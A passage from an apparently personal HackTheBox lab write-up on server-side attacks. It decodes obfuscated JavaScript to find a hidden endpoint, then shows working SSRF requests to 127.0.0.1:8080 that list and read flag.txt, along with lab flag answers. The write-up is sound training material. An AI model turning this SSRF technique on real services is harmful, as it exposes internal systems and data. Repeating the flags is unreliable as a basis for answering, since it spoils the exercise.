+        -rw-r--r-- 1 root root   23 Oct 28  2021 flag.txt
+        -rw-r--r-- 1 root root 1872 Oct 28  2021 index.html
+        drwxr-xr-x 4 root root 4096 Nov  1  2021 static
+        posix-linux $ cat flag.txt
+        HTB{l33tSk1llsY0uH4ve}
+        posix-linux $ 
+
+        [!] Answer: "HTB{l33tSk1llsY0uH4ve}"
+
+
+[Server-Side Attacks - Skills Assessment]
+
+[*] Target: 167.99.192.213:30845
+
+[Question 1]  Read the content of 'flag.txt' through a server-side attack without registering an account and submit its content as your answer. Answer format: HTB{String}
+
+    - Oke so now we know that we need to register an account to find the flag
+
+    - After creating an account and log in, I found that we can post something
+
+    - But! Nothing, I found nothing, tplmap and all kind of cheatsheet can't do anything.
+
+    - Finally, I found this, look at the source code (http://167.99.192.213:30845/create)
+
+        ...
+        </ul>
+        </nav>
+        <section class="content">
+        <header>
+            <script type="text/javascript" src="/static/jquery.js"></script>
+            
+        <h1>New Post</h1>
+        ...   
+
+    => http://167.99.192.213:30845/static/jquery.js
+
+        function dec(str) {
+            var w = atob(str);
+            return w.split("").reverse().join("");
+        }
+        function getmessage() {
+            var x = "Ly86cHR0aA==";
+            var y = "dHNvaC5ub2l0YWNvbC53b2RuaXc=";
+            var z = "dHh0LmVnYXNzZW0vMDgwODoxLjAuMC43MjEvLzpwdHRoPXQzM2w/M000M2wxRnQ0aFR0M0cv";
+            var woot = dec(x) + eval(dec(y)) + dec(z);
+            fetch(woot)
+            .then(response => response.text())
+            .then(data => {
+                return confirm(data);
+            });
+        }
+
+    => x = '//:ptth' => dec(x) = 'http://'
+
+    => y = 'tsoh.noitacol.wodniw' => dec(y) = 'window.location.host'
+
+    => z = 'txt.egassem/0808:1.0.0.721//:ptth=t33l?3M43l1Ft4hTt3G/' => dec(z) = '/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/message.txt'
+
+        [?] The eval() function is used to evaluate the expression dec(y), which is 'window.location.host'.
+            This code is running in a browser environment, window.location.host refers to the hostname and port of the current URL.
+
+        => http://167.99.192.213:30845/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/message.txt => 'Are You Sure?'
+
+        => http://167.99.192.213:30845/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/ => 
+
+            Directory listing for /
+            flag.txt
+            message.txt
+
+        => http://167.99.192.213:30845/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/flag.txt => HTB{Th4tW4sL33t1snt1t?}
+
+    [!] Answer: "HTB{Th4tW4sL33t1snt1t?}"
